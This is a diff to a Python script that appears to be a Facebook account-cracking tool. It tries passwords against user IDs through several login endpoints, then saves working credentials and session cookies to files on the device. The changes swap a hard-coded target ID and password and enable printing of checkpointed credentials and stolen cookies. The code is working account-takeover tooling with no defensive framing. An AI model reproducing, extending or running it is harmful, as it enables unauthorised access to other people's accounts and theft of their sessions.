@@ -1126,8 +1126,8 @@ def SUMON2():
             #uid = kode+guru
             #mk = uid[:6]
             #pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
-            uid ='61557902314449'
-            pwx ='963686'
+            uid ='100081158172195'
+            pwx ='963645'
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1721,7 +1721,7 @@ def graph(uid, name, pwx, tl):
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-               #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                print(f" {red}[SUMON-CP] {uid}|{pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
@@ -1883,11 +1883,11 @@ def p(uid,pwx,tl):
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
                         print(f" {green}[SUMON-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
+                        print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
                         print(f" {green}[SUMON-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
+                        print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                         oks.append(uid)
                         break
